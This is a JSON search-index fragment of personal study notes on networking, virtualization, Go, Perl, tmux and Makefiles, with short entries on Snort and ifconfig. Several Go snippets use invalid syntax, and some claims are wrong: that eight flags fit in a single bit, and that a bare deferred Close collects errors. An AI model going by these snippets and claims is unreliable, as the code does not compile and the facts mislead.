mode_wi-fi","text":""},{"location":"docs/Network/WI-FI/managed_mode_wi-fi/#manged","title":"Manged","text":"<p>The device is prepared to connect to an access point</p> <p>[!quote]</p>"},{"location":"docs/Network/WI-FI/master_mode_wi-fi/","title":"master mode_wi-fi","text":""},{"location":"docs/Network/WI-FI/master_mode_wi-fi/#master","title":"Master","text":"<ul> <li>The device is ready to act as an AP itself or is already functioning     as one.<ul> <li>In this mode, other wireless devices can connect to it to     access the network.</li> </ul> </li> </ul> <p>[!quote] iwlist</p>"},{"location":"docs/Network/WI-FI/modes_wi-fi/","title":"Wi-Fi Modes","text":"<p>Wi-Fi can operate in 3 modes</p> <ol> <li>[[monitor mode_wi-fi]]</li> </ol> <p>[!quote]</p>"},{"location":"docs/Network/WI-FI/security_wi-fi/","title":"security wi-fi","text":""},{"location":"docs/Network/WI-FI/security_wi-fi/#security","title":"Security","text":"<p>This is the security protocol used on the Wi-Fi AP that is being read from. There are three primary security protocols for Wi-Fi. - The original, Wired Equivalent Privacy (WEP), was badly flawed and eas-ily cracked. - Its replacement, Wi-Fi Protected Access (WPA), was a bit moresecure. - Finally, WPA2-PSK, which is much more secure and uses a pre-shared key (PSK) that all users share, is now used by nearly all Wi-FiAPs (except enterprise Wi-Fi).</p> <p>[!quote]</p>"},{"location":"docs/Network/basic_network_connections/Automatic_Private_IP_Addessing/","title":"Automatic Private IP Addessing","text":""},{"location":"docs/Network/basic_network_connections/Automatic_Private_IP_Addessing/#apipa","title":"APIPA","text":""},{"location":"docs/Network/basic_network_connections/Automatic_Private_IP_Addessing/#alt-name-a-link-local-address-it-works-when-dhcp","title":"alt-name A link-local address - It works when [DHCP","text":"<p>server](../../../Network/Phisicall/DHCP_server) is not avaible - Can only communicate to other local devices - No forwording by routers</p>"},{"location":"docs/Network/basic_network_connections/Automatic_Private_IP_Addessing/#how-to-see-u-were-assign-apipa","title":"How to see u were assign APIPA","text":"<ul> <li>IF your IP address is between     169.254.0.1 throug 169.254.255.254<ul> <li>First and last 256 addresses are reserver</li> <li>Functional block 169.254.1.0 through 169.254.254.255</li> </ul> </li> <li>The APIPA choses the random adress and the checs weather another     device is not using it</li> </ul>"},{"location":"docs/Network/basic_network_connections/IPv4_address/","title":"IPv4 address","text":""},{"location":"docs/Network/basic_network_connections/IPv4_address/#internet-protocol-version-4","title":"Internet Protocol version 4","text":""},{"location":"docs/Network/basic_network_connections/IPv4_address/#alt-name-osi-layer-3-address","title":"alt-name OSI Layer 3 address","text":"<p>[!quote] web socets|Network_OSI | IP |</p>"},{"location":"docs/Network/basic_network_connections/NAT/","title":"NAT","text":""},{"location":"docs/Network/basic_network_connections/NAT/#network-address-translotion","title":"Network Address Translotion","text":"<p>The devicec changes ip while it communicate trhugh networ #alt-name NAT - The address network for IPv4 address is exausted - Therfore the router has to translate the IP (change up the IP ) -  \u2014</p>"},{"location":"docs/Network/basic_network_connections/NAT/#nat-overloadpat","title":"Nat Overload/Pat","text":""},{"location":"docs/Network/basic_network_connections/NAT/#alt-name-port-address-translation","title":"alt-name Port Address Translation <p> - It adds the port to address - It then converts the Private IP address to the publick one - </p>  <p>Private IP address [[SDN#Infrastructure Layer|Infrastructure Layer]] DNS</p>","text":""},{"location":"docs/Network/basic_network_connections/Private_IP_address/","title":"Private IP address","text":""},{"location":"docs/Network/basic_network_connections/Private_IP_address/#private-address","title":"Private address","text":""},{"location":"docs/Network/basic_network_connections/Private_IP_address/#alt-name-rfc-1918","title":"alt-name RFC 1918","text":"<p>[!quote] NAT</p>"},{"location":"docs/Network/basic_network_connections/Reserved_addresses/","title":"Reserved addresses","text":""},{"location":"docs/Network/basic_network_connections/Reserved_addresses/#reserved-addresses","title":"Reserved addresses","text":"<ul> <li>Addresses that are not used and dayly baisis<ul> <li>They are set aside for testing or futrue use<ul> <li>240.0.0.1 thhrough 254.255.255.254</li> <li>All Class E addresses</li> </ul> </li> </ul> </li> </ul> <p>[!quote] Virtual IP | [[IP]] | subnet mask | DNS</p>"},{"location":"docs/Network/basic_network_connections/defult_gateway/","title":"defult gateway","text":""},{"location":"docs/Network/basic_network_connections/defult_gateway/#defult-gateway","title":"Defult Gateway","text":"<ul> <li>The router that allows u to communicate outside of your local     subnet<ul> <li>The Defult Gateway must be an     IP address on the local     subnet<ul> <li>e.g.\u00a0192.168.1.1</li> </ul> </li> </ul> </li> </ul> <p>[!quote] subnet mask ; DNS ; lo</p>"},{"location":"docs/Network/basic_network_connections/subnet_mask/","title":"subnet mask","text":"<pre><code>## Subnet Mask\n</code></pre> <p>Its dividing Network_OSI into smaller inner networks In decimals is the sereies of ones and zeros at the end(111111.11111.11111.0000) #alt-name /24 Classes Interdoamin Routing (CIDR)(\u2018slach notation\u2019) In order to calculate this we sum up all the ones use cheat sheet &gt;[!example]- &gt; &gt;&gt;[!tip]- Cheat sheet &gt;&gt; </p> <ul> <li>Each subnet is identified by a unique network address and a subnet     mask, which is used to determine the range of IP addresses that     belong to that subnet.<ul> <li>e.g.,255.255.255.0<ul> <li>Used by the local device in conjunction with     IP to determnie what     subnet its on<ul> <li>The subnet mask is not (ussualy transmited across the     network)</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>Now we use VLSM instead of subnet classes</p> <p>subnet construction &gt;[!quote] defult gateway DHCP server</p>"},{"location":"docs/Network/vitrual/Virtual_IP/","title":"Virtual IP","text":""},{"location":"docs/Network/vitrual/Virtual_IP/#virtual-ip","title":"Virtual IP","text":""},{"location":"docs/Network/vitrual/Virtual_IP/#alt-name-vip-not-assosiated","title":"alt-name VIP - Not assosiated","text":"<p>with a physical network adapter - Virtual machine internal router addres</p> <p>[!quote] Virtual networks | Reserved addresses |[[virtual hosting]]</p>"},{"location":"docs/Network/vitrual/hypervisor/","title":"hypervisor","text":""},{"location":"docs/Network/vitrual/hypervisor/#virtual-machine-manager","title":"Virtual Machine Manager","text":"<p>Hyperviser_visual.png Manages the virtual paltform and guest operating system - Hardwere Manager Cpu Networking Seciurty - Single console control #alt-name **One pane of glass - instead of managing houdrets of virtulasystem u just go to the one managing system* &gt; [!quote] vSwitch</p>"},{"location":"docs/Network/vitrual/vNIC/","title":"vNIC","text":""},{"location":"docs/Network/vitrual/vNIC/#virtual-network-interface-card","title":"Virtual Network Interface Card","text":"<ul> <li>A virtual machine needs a network interface</li> <li>Configured and connected through the     hypervisor<ul> <li>Enable additional features</li> <li>[[VLAN]] aggregation, multiple interfaces &gt;[!example]     </li> </ul> </li> </ul>"},{"location":"docs/Network/vitrual/vSwitch/","title":"vSwitch","text":""},{"location":"docs/Network/vitrual/vSwitch/#virtual-switch","title":"Virtual switch","text":"<p>Netwok that connects all of the virtual machines  - Move the psychical switch into the virtual envairoment - Functionality similar to a psychical switch - Forwarding options - Like aggregation - Port mirroring - NetFlow</p> <p>[!tip] Its just the psychical switch pushed to the virtual envairoment</p> <ul> <li>Deployed from the     hypervisor Automate with     orchestration &gt; [!example]     </li> </ul> <p>[!quote] vNIC</p>"},{"location":"docs/PROGRAMMING/emacs/","title":"Emacs","text":""},{"location":"docs/PROGRAMMING/emacs/#org","title":"Org","text":""},{"location":"docs/PROGRAMMING/emacs/#navigating-calendar","title":"Navigating Calendar","text":"<p>Hold down the shift key while you use the arrows. Shift-right and left will move by days, Shift-up and down by weeks. Alt-Shift right and left will move by months, and Alt-Shif up and down will move by yea</p>"},{"location":"docs/PROGRAMMING/emacs/#agenda","title":"Agenda","text":"<ul> <li>In order to display todos in markodwn u have to set the file to     <code>org-agenda-file-to-front</code></li> </ul>"},{"location":"docs/PROGRAMMING/makefile/","title":"Makefile","text":""},{"location":"docs/PROGRAMMING/makefile/#sturcture","title":"Sturcture","text":"<pre><code># Define PHONY targets to prevent conflicts with files named like the target\n.PHONY: build test install clean\n\n# First input is the defult one \nbuild: cmd/main\n    pp -o qizz cmd/main\n\n#The test target now depends on build\n#The -- in carton exec -- separates the command from any options carton might interpret\ntest: build\n    carton exec -- perl tests/*\n\n\ninstall:\n    carton install\n\nclean:\n    rm -f qizz\n\nall: install build test\n</code></pre>"},{"location":"docs/PROGRAMMING/makefile/#make-for-python","title":"Make for python","text":"<pre><code>.PHONY: test clean\n\ntest:\n    PYTHONPATH=. python -m unittest discover -s . -p \"test_*.py\" -v\n\n\nclean:\n    find . -type d -name \"__pycache__\" -exec rm -r {} +\n    find . -type f -name \"*.pyc\" -delete\n    find . -type f -name \"*.pyo\" -delete\n</code></pre>"},{"location":"docs/PROGRAMMING/pacage_versioning/","title":"pacage versioning","text":"<ul> <li>MAJOR version when you make incompatible API changes</li> <li>MINOR version when you add functionality in a backward     compatible manner</li> <li>PATCH version when you make backward compatible bug fixes</li> </ul>"},{"location":"docs/PROGRAMMING/tmux/","title":"Tmux","text":""},{"location":"docs/PROGRAMMING/tmux/#run-tmux-without-the-config","title":"Run tmux without the config","text":"<pre><code>tmux -f /dev/null\n</code></pre>"},{"location":"docs/PROGRAMMING/tmux/#markers","title":"Markers","text":"<p><code>M</code> near the pane marked it as selected</p>"},{"location":"docs/PROGRAMMING/tmux/#breaking-panes","title":"Breaking panes","text":"<pre><code>bind-key !k\n</code></pre>"},{"location":"docs/PROGRAMMING/tmux/#joining-panes","title":"Joining-panes","text":"<pre><code>join-pane -t &lt;optional session name&gt;:&lt;destination pane\n</code></pre>"},{"location":"docs/PROGRAMMING/tree-sitter/","title":"Tree-sitter","text":"<ul> <li>Parser geneator tool<ul> <li>Incremental parsing libiray*</li> <li>A query engin</li> <li>Generate a syntax tree</li> <li>Ask question about text</li> </ul> </li> <li>Only dependency is the C compiler ## Tree-sitter is Not</li> <li><code>LSP</code> it doesn\u2019t look at projecet as whole</li> <li><code>Compiler</code></li> <li><code>Interpretor</code></li> </ul>"},{"location":"docs/PROGRAMMING/zig/","title":"Using C library","text":"<p>If u want to incroportate any C libray into zig U have to pass <code>exe.linkLibC();</code> to the build.zig</p> <p>Example zig c usage header</p> <pre><code>const c = @cImport({\n    @cInclude(\"utmp.h\");\n});\n\nconst utmp = @import(\"utmp.zig\");\nconst Allocator: std.mem.Allocator;\nconst Vector: std.ArrayList;\n</code></pre>"},{"location":"docs/PROGRAMMING/code_problems/Add_two_numbers/","title":"codingProblem ## Description","text":"<ul> <li>U\u2019re given two none empty array</li> <li>Each node contains single digit</li> <li>If sum of the numbers bigger then zero add +1 to the node</li> <li> <p>Nodes are in the reverse order ### Edge cases</p> </li> <li> <p>Node is empty</p> </li> <li></li> </ul>"},{"location":"docs/PROGRAMMING/code_problems/Add_two_numbers/#code","title":"Code","text":"<pre><code>type ListNode struct {\n    Val  int\n    Next *ListNode\n}\n\nfunc addTwoNumbers(l1 *ListNode, l2 *ListNode) *ListNode {\n    head := ListNode{}\n    cur := &amp;head\n    carry := 0\n\n    for l1 != nil || l2 != nil || carry != 0 {\n        // Extract values from nodes or set to 0 if node is nil\n        var v1, v2 int\n        if l1 != nil {\n            v1: l1.Val\n            l1: l1.Next\n        } else {\n            v1: 0\n        }\n        if l2 != nil {\n            v2: l2.Val\n            l2: l2.Next\n        } else {\n            v2: 0\n        }\n\n        // Calculate sum including carry\n        sum := v1 + v2 + carry\n        carry: sum / 10\n        cur.Next = &amp;ListNode{Val: sum % 10}\n        cur: cur.Next\n    }\n\n    return head.Next\n}\n</code></pre> <p>[Linked List]({{\\&lt; ref \u201cposts/Algorithms/Linked_List.md\u201d&gt;}})</p>"},{"location":"docs/PROGRAMMING/go/Go_chanels/","title":"Go chanels","text":""},{"location":"docs/PROGRAMMING/go/Go_chanels/#read-from-multiple-channels","title":"Read from multiple channels","text":"<pre><code>func main() {\n\n  c1 := make(chan int)\n  c2 := make(chan int)\n  out := make(chan int)\n\n  go func(in1, in2 &lt;-chan int, out chan&lt;- int) {\n    for {\n      sum := 0\n      select {\n      case sum = &lt;-in1:\n        sum += &lt;-in2\n\n      case sum = &lt;-in2:\n        sum += &lt;-in1\n      }\n      out &lt;- sum\n    }\n  }(c1, c2, out)\n}\n</code></pre> <ul> <li>go concurency</li> <li>go main</li> </ul>"},{"location":"docs/PROGRAMMING/go/Golang_AWS_issue/","title":"issue","text":"<ul> <li>Go wont copile on aws unleess this paramter is being added to the     copmpilation flag</li> <li>the fucntion either cant share the dir or its impossible for it to     acess diffren name of the bainery only main is accebtable<ul> <li>If its not main it gives the ereror of the the file has no been     found and fails</li> </ul> </li> <li>Even if u sepcyfie that the bucket file should bee public it still     make u no enabke permmiosn by ginbn u this error<ul> <li></li> </ul> </li> <li>The way to fix is to set first enable the Acl in the consloe and use     it in the code     </li> </ul>"},{"location":"docs/PROGRAMMING/go/go_bitwise_operators/","title":"Bitwise operators","text":"<p>You can store up to 8 boolean flags in a single bit.</p> <p>Video</p>"},{"location":"docs/PROGRAMMING/go/go_bitwise_operators/#defining-the-bitflags","title":"Defining the Bitflags (\\&lt;\\&lt;)","text":"<pre><code>type flag uint\n\nconst (\n    // Shifts the bit for two places for the rest of the flags \n    // so they are unique \n    READ flag: 1 &lt;&lt; iota \n    EXECUTE\n    WRITE \n    // You can also combine all keywords into one \n    ALL flag: READ | WRITE | EXECUTE\n)\n</code></pre>"},{"location":"docs/PROGRAMMING/go/go_bitwise_operators/#passing-the-bitflags","title":"Passing the BitFlags (|)","text":"<p>checks what values are passed and applies them:</p> <pre><code>func test(f flag) {\n    // Function implementation here\n}\n\n// This will combine them \n// So the test will have read and write permissions\nfunc main() {\n    test(READ | WRITE)\n    // Or to get all \n    test(ALL)\n}\n</code></pre>"},{"location":"docs/PROGRAMMING/go/go_bitwise_operators/#checking-the-bitflags","title":"Checking the BitFlags (&amp;)","text":"<p>checks if a specific flag matches:</p> <pre><code>switch {\ncase flag &amp; READ:\nfmt.Println(\"You can read :)\")\n}\n</code></pre>"},{"location":"docs/PROGRAMMING/go/go_concurency/","title":"Concurency","text":"<p>Article</p>"},{"location":"docs/PROGRAMMING/go/go_concurency/#mutex","title":"Mutex","text":"<p>Constrain the acess to only 1 thread (guards a critical selection of the code) ### Semaphore Constrains access to at most N threads, to control/limit concurrent access to a shared resource.</p> <pre><code>// Acquiring \nsem.Acquire(ctx, 1) // equivalent to sem &lt;- 1 (using channel approach)\n// Releasing \nsem.Release(1) // equivalent to &lt;- sem (using channel approach&gt;\n</code></pre>"},{"location":"docs/PROGRAMMING/go/go_embed/","title":"Go embed","text":"<p>It ascess files at <code>runtime</code> that have been embeded at compile time** package embed // import \u201cembed\u201d</p> <p>Package embed provides access to files embedded in the running Go program.</p> <p>Go source files that import \u201cembed\u201d can use the //go:embed directive to initialize a variable of type string, []byte, or FS with the contents of files read from the package directory or subdirectories at compile time.</p> <p>For example, here are three ways to embed a file named hello.txt and then print its contents at run time.</p> <p>Embedding one file into a string: [HardLink]</p>"},{"location":"docs/PROGRAMMING/go/go_example_based_test/","title":"Go Example Based Test","text":""},{"location":"docs/PROGRAMMING/go/go_example_based_test/#how-example-based-tests-work-in-go","title":"How Example-Based Tests Work in Go","text":"<p>In Go, example-based tests are written as functions with the prefix <code>Example</code> in their names. These tests are placed in the same <code>_test.go</code> file as your regular unit tests. They are executed by the <code>go test</code> tool and, when correctly formatted, can be included in the documentation generated by <code>go doc</code> or <code>godoc</code>.</p>"},{"location":"docs/PROGRAMMING/go/go_example_based_test/#key-characteristics-of-example-based-tests-in-go","title":"Key Characteristics of Example-Based Tests in Go:","text":"<ol> <li>Automatic Validation: If an <code>Example</code> function contains a     <code>// Output:</code> comment, Go will automatically check that the output     matches the expected output during testing.</li> <li>Documentation Integration: The Go documentation tools (<code>godoc</code>)     automatically pick up example functions and display them in the     generated documentation.</li> <li>Clear and Human-Readable: Examples provide an accessible way for     developers to understand how to use the functions and structs.</li> </ol>"},{"location":"docs/PROGRAMMING/go/go_example_based_test/#writing-example-based-tests","title":"Writing Example-Based Tests","text":""},{"location":"docs/PROGRAMMING/go/go_example_based_test/#example-structure","title":"Example Structure:","text":"<ol> <li>Create a function named <code>ExampleXyz</code> where <code>Xyz</code> is the function     you want to document and test.</li> <li>Provide sample code within the function that demonstrates its     usage.</li> <li> <p>Include an <code>Output</code> comment that shows the expected output of     the function. This comment serves as both a test expectation and     documentation.</p> </li> <li> <p>Include Multiple Examples if Needed: If your function supports     different use cases or has edge cases, create additional example     functions like <code>ExampleParseHeader_edgeCase</code> or     <code>ExampleParseHeader_emptyHeader</code>.</p> </li> </ol> <p>Always take the names of ur'e functions inside the []!!!</p> <pre><code>package main\n\ntype Header struct {\n    Level int\n    Name  string\n}\n\nfunc ParseHeader(s string) *Header {\n    level := 0\n}\n\n// ExampleParseHeader provides an example-based test for [ParseHeader] function\nfunc ExampleParseHeader() {\n    // Sample input and parsing demonstration\n    header := ParseHeader(\"### Example Header\")\n    fmt.Printf(\"Level: %d, Name: %q\\n\", header.Level, header.Name)\n\n    // Output:\n    // Level: 3, Name: \"Example Header\"\n}\n</code></pre> <ul> <li>go main</li> </ul>"},{"location":"docs/PROGRAMMING/go/go_main/","title":"Go Main","text":""},{"location":"docs/PROGRAMMING/go/go_main/#handaling-file-operation","title":"Handaling file operation","text":"<pre><code>    done := make(chan struct{})\n    var f *lockedfile.File\n    var openErr error\n\n    go func() {\n        f, openErr = lockedfile.OpenFile(JOINED, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)\n        close(done)\n    }()\n\n    select {\n    case &lt;-time.After(3 * time.Second):\n        return nil, fmt.Errorf(\"timeout waiting for file lock - another instance may be running\")\n    case &lt;-done:\n        if openErr != nil {\n            return nil, fmt.Errorf(\"error opening joined file: %w\", openErr)\n        }\n    }\n</code></pre>"},{"location":"docs/PROGRAMMING/go/go_main/#proper-way-to-closing-files-on-defer","title":"Proper way to closing Files on defer","text":"<p>Thsis will collects the error message if file could\u2019nt be closed</p> <pre><code>defer func(){\n    f.Close()\n}()\n</code></pre>"},{"location":"docs/PROGRAMMING/go/go_main/#checki-the-lenght-of-the-stirng","title":"Checki the lenght of the stirng","text":""},{"location":"docs/PROGRAMMING/go/go_main/#casting-absolute-path-in-go","title":"Casting absolute path in go","text":"<p>Aparently it\u2019s enough to cast <code>filepath.Abs</code> on the file to get the absolute path</p> <pre><code>func walk(s string, d fs.DirEntry, err error) error {\n    if err != nil {\n        return err\n    }\n    if !d.IsDir() {\n        absPath, err := filepath.Abs(s)\n        if err != nil {\n            return err\n        }\n        fmt.Println(absPath) \n    }\n    return nil\n}\n\nfunc Find(dir string, condition string, exec string) {\n    absDir, err := filepath.Abs(dir)\n    if err != nil {\n        fmt.Printf(\"Error: %v\\n\", err)\n        return\n    }\n\n    err = filepath.WalkDir(absDir, walk)\n    if err != nil {\n        fmt.Printf(\"Error walking the directory: %v\\n\", err)\n    }\n}\n</code></pre>"},{"location":"docs/PROGRAMMING/go/go_main/#readercloser-interface","title":"ReaderCloser Interface","text":"<p>It\u2019s for an explicit definition of Reader and Closer interface.</p> <p>So let\u2019s say you write some functionality that reads data, but you also want to close resource after doing it (again not to leak descriptors).</p> <p>You are forcing client of your API to define Read and Close interfaces implementations, not just io.Reader.</p> <pre><code>func ...(r io.ReaderCloser) {\n    defer r.Close()\n    ... // some reading\n}\nfunc doIt(rc io.ReadCloser) {\n    defer rc.Close()\n    buf := make([]byte, 4)\n    n, err := rc.Read(buf)\n    if err != nil {\n        log.Fatal(err)\n    }\n    fmt.Printf(\"%s\\n\", buf[:n])\n}\n</code></pre> <ul> <li>go bitwise operators</li> <li>go concurency</li> <li>go embed</li> <li>go example based     test</li> </ul>"},{"location":"docs/PROGRAMMING/go/lockfile_go/","title":"Filelocked Golang","text":"<p>Package lockedfile creates and manipulates files whose contents should only change atomically.</p> <p>Package</p>"},{"location":"docs/PROGRAMMING/perl/perl_main/","title":"Perl","text":""},{"location":"docs/PROGRAMMING/perl/perl_main/#check-for-tainted-varialbes","title":"Check for tainted varialbes","text":"<p>This means if any whre maniputaled by the user</p> <p>Always in scritps add <code>#!/usr/bin/perl -T</code></p> <p>Perl has modules that will check thsi ex. for databeses</p> <p>Article</p> <pre><code>perl -T script.pl\n</code></pre> <p>**U can set a scure path to run only executables from this path **</p> <pre><code>$ENV{'PATH'} = '/usr/local/bin:/usr/bin:/bin';\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_main/#get-the-specyfic-column-similar-to-awk","title":"Get the specyfic column similar to awk","text":"<p><code>-F</code> is for filed separator similarly to awk</p> <pre><code>df -iT | perl -F'\\s+' -lane 'print $F[0] + $F[2]'\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_main/#get-the-sum-of-the-elements-form-stdin","title":"Get the sum of the elements form stdin","text":"<pre><code>perl -lane '$sum += $F[0]; END { print $sum }' file.txt\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_main/#explanation","title":"Explanation:","text":"<ul> <li><code>-l</code>: Automatically chomps the input line and adds a newline to the     output.</li> <li><code>-a</code>: Automatically splits each line into the <code>@F</code> array based on     whitespace.</li> <li><code>-n</code>: Processes each line of the input file in a loop.</li> <li><code>$sum += $F[0]</code>: Accumulates the sum of the first column.</li> <li><code>END { print $sum }</code>: Prints the total sum after processing all     lines.</li> </ul>"},{"location":"docs/PROGRAMMING/perl/perl_main/#perl-compilation","title":"Perl compilation","text":"<p>Docs <code>pp</code> it will embed perl to the binary</p> <pre><code>pp -o packed.exe source.pl        # makes packed.exe\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_main/#perl-pacagemenager","title":"Perl pacagemenager","text":"<p>Install Carton <code>cpanm Carton</code></p> <p>Set Up the cpanfile: In your project directory, create a cpanfile and list your module dependencies there</p> <pre><code># cpanfile\nrequires 'Test::MockModule', '0.17';\nrequires 'Test::More', '1.302162';\n</code></pre> <p>then</p> <pre><code>carton install\ncarton exec perl your_script.pl\ncarton exec prove -l\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_main/#perl-varaibles","title":"Perl varaibles","text":"<p>if we the function requiers an argument and we will not feed it direcly **it will use the defult vallue **</p> <p>exaple beeing for loop</p> <pre><code>perl -e 'while(&lt;&gt;){$x+= lenght}print \"$x\\n\"'\n</code></pre> <p><code>-ep</code> doesnt work for some resone use <code>-pe</code></p> <p>This implisitly prints the varaible</p> <pre><code>pgrep -i hugo  | perl -pe ' $_/=1024'\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_main/#perl-loops","title":"Perl loops","text":"<p>While Docs</p> <p>Perl evaluates the statements <code>from right to left</code>.</p> <p>It means that Perl evaluates the condition in the while statement at the beginning of each iteration.</p> <p>faster while loop</p> <pre><code>perl -e 'print \"hello\\n\" while(true)'\n</code></pre> <p>foor loop with glob</p> <pre><code>perl -e 'for my $f (glob \"*\") { print `cat $f` if -f $f; }'\n</code></pre> <pre><code>ram  | perl -lane '$sum += $F[0]; END { print $sum/1024 }'\n# or \nps aux | perl -lane 'print $F[1]; $sum+=$F[1]; END { print $sum }'\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_main/#sort-function","title":"Sort function","text":"<p>Perl <code>sort()</code> function sorts a list and returns a sorted list.</p> <p>The original list remains intact.</p> <p>The sort() function has three forms:</p> <pre><code>sort list;\nsort block list;\nsort subroutine_name list\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_main/#open-files","title":"Open files","text":"<p>Summary of Modes - <code>&lt;</code>: Read only. <code>&gt;</code> : Write only (truncates). - <code>+&lt;</code> : Read and write. <code>+&gt;</code> : Write and read(truncates). - <code>+&gt;&gt;</code>: Append and read. <code>&gt;&gt;</code> : Append.</p>"},{"location":"docs/PROGRAMMING/perl/perl_main/#append-the-file-with-contents","title":"Append the file with contents","text":"<p>similar to go fmt.Printf in buffer</p> <pre><code># String to append\nmy $string = \"This is the string to append\\n\";\n\n# Open file in append mode\n# U can do this way but unreadable \nprint $fh $string;\n\n#this is much better\nprintf $f (\"%s\\n\", $flash) \n\nclose($fh) or die \"Cannot close file: $!\";\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_main/#grep-usage","title":"Grep usage","text":"<p>ARGV Holds the name of the file where $&amp; holds the match  If u dont't use close after $ARGV then  it will look further and pruitn this agian</p> <p>Finding weather the string matches the file  <pre><code>perl -wnl -e '/pass auf/i and print $ARGV and close $ARGV ;' ./*\n$ perl -nle '$seen{$ARGV}++ or print $ARGV if /pass|auf/i' *\n\n./czasKatedr.md\n./test.md\n</code></pre></p>"},{"location":"docs/PROGRAMMING/perl/perl_main/#matching-in-context","title":"MAtching in context","text":"<p>Example printing with the context perl --00 -nle  'print if /pass/ i'</p>"},{"location":"docs/PROGRAMMING/perl/perl_main/#templating","title":"Templating","text":"<p>CONVERTING SPECIAL CHARACTERS 103 <pre><code>#! /usr/bin/perl -s \u2013wpl\n# Template processor for SPUG meeting announcement\ns/ %%DATE%% /$date/gx;\ns/ %%SPEAKER%% /$speaker/gx;\ns/ %%TITLE%% /$title/gx;\ns/ %%CONTACT%% /$contact/gx;\ns/ %%SUMMARY%% /$summary/gx;\n</code></pre></p> <p>Begin block <pre><code>#! /usr/bin/perl -s -i.bak -wpl\n# Inserts contact info for script author after shebang line\nBEGIN {\n$author or\nwarn \"Usage: $0 -author='Author info' f1 [f2 ...]\\n\" and\nexit 255;\n}\n# Append contact-info line to shebang line\n$. == 1 and\ns|^#!.*/bin/.+$|$&amp;\\n# Author: $author|g\n</code></pre></p>"},{"location":"docs/PROGRAMMING/perl/perl_main/#test-operators","title":"Test operators","text":"<p>U can easily run perl for  the test operators <pre><code>find -type f | perl -lne  'print if -B ' \n</code></pre> File Test Operators in Perl <code>Operator</code> <code>Description</code> -r  File is readable by the current user -w  File is writable by the current user -x  File is executable by the current user -o  File is owned by the current user -R  File is readable by real user ID -W  File is writable by real user ID -X  File is executable by real user ID -O  File is owned by real user ID -e  File exists -z  File exists and is empty -s  File exists and is not empty (returns size in bytes) -f  File is a regular file (not a directory, pipe, etc.) -d  File is a directory -l  File is a symbolic link -p  File is a named pipe (FIFO) -S  File is a socket -b  File is a block special file (e.g., disk device) -c  File is a character special file (e.g., terminal) -u  File has setuid bit set -g  File has setgid bit set -k  File has sticky bit set -t  Filehandle is opened to a terminal (TTY) -T  File is a text file -B  File is a binary file -M  File's age in days since last modification -A  File's age in days since last access -C  File's age in days since last inode change</p> <ul> <li>perl pod</li> <li>perl main</li> <li>perl regex</li> </ul>"},{"location":"docs/PROGRAMMING/perl/perl_pod/","title":"POD","text":""},{"location":"docs/PROGRAMMING/perl/perl_pod/#plain-old-documentation","title":"Plain old documentation","text":"<p>In this example:</p> <ul> <li>=head1 NAME is used to define the name of the script.</li> <li>=head1 SYNOPSIS provides a brief usage summary.</li> <li>=head1 DESCRIPTION contains the main content of the documentation.</li> <li>=head1 OPTIONS lists the options available for the script.</li> <li>=head1 AUTHOR and =head1 COPYRIGHT AND LICENSE provide author and     licensing information.</li> </ul> <p>To view the documentation, you can run:</p> <pre><code>perldoc YourScript.pl\n</code></pre> <p>This will display the formatted documentation extracted from the POD sections of your script. In this example:</p> <ul> <li>=head1 NAME is used to define the name of the script.</li> <li>=head1 SYNOPSIS provides a brief usage summary.</li> <li>=head1 DESCRIPTION contains the main content of the documentation.</li> <li>=head1 OPTIONS lists the options available for the script.</li> <li>=head1 AUTHOR and =head1 COPYRIGHT AND LICENSE provide author and     licensing information.</li> </ul> <p>To view the documentation, you can run:</p> <pre><code>perldoc YourScript.pl\n</code></pre> <p>This will display the formatted documentation extracted from the POD sections of your script.</p>"},{"location":"docs/PROGRAMMING/perl/perl_regex/","title":"Perl regex","text":"<p><code>PCRE</code> stands for \u201cPerl Compatibe Regular Expressions.</p> <p>Article</p>"},{"location":"docs/PROGRAMMING/perl/perl_regex/#perl-re-structure","title":"Perl re structure","text":"<p>Artilce</p> <p>You\u2019ll usually see Perl regex patterns expressed between forward slashes<code>/this pattern/</code></p> <p>But you don\u2019t have to use forward slashes.!! the \u201clong form\u201d, where m for \u201cmatch\u201d or s for \u201csubstitute\u201d precedes the pattern, you can use any delimiter you like. &gt; For instance, <code>m~some pattern~</code> is valid</p> <pre><code>next unless $flash =~ m{[^:]+:[^:]+};\n</code></pre>"},{"location":"docs/PROGRAMMING/perl/perl_regex/#embed-regular-expresions","title":"Embed regular expresions","text":"<p>The syntax <code>(?{...})</code> lets you run arbitrary Perl code each time this part of the regex is successfully matched</p> <p><code>$&amp;</code> is a special Perl variable that holds the entire part of the string that was matched by the regex so far</p> <p><code>$1</code> contains the content of (capture group 1)</p>"},{"location":"docs/PROGRAMMING/perl/perl_regex/#back-tracking","title":"Back tracking","text":""},{"location":"docs/PROGRAMMING/perl/perl_regex/#common-patterns","title":"Common patterns","text":"<p><code>[^\"]+</code> match all the content between certain delimite</p>"},{"location":"docs/Penetration/Bcast/","title":"Bcast","text":""},{"location":"docs/Penetration/Bcast/#brodcast-addresss","title":"Brodcast addresss","text":"<p>Address used to send out information to all IPs on the subnet</p> <p>Subnet Mask</p>"},{"location":"docs/Penetration/NIDS/","title":"NIDS","text":""},{"location":"docs/Penetration/NIDS/#networks-intrusion-detection-system","title":"Networks Intrusion Detection System","text":""},{"location":"docs/Penetration/Snort/","title":"Snort","text":""},{"location":"docs/Penetration/Snort/#snort","title":"Snort","text":"<p>It is widely used to detect and prevent malicious network traffic, such as malware, viruses, and other cyber threats. Snort works by monitoring network traffic in real-time and comparing it against a set of rules or signatures that define known attack patterns. When Snort detects a potential threat, it can generate alerts, block traffic, or take other actions to mitigate the attack. - It\u2019s one of NIDS</p>"},{"location":"docs/Penetration/ifconfig/","title":"ifconfig","text":""},{"location":"docs/Penetration/ifconfig/#ifconfig","title":"Ifconfig","text":"<p>Examine and interact with active network interfaces.</p> <p>[!example] </p> <p>This displays the most important information: 1. [MAC Address] 2. IP 3. Broadcast 4. Loopback</p> <p>If you want to see the IP, you have to run <code>ip 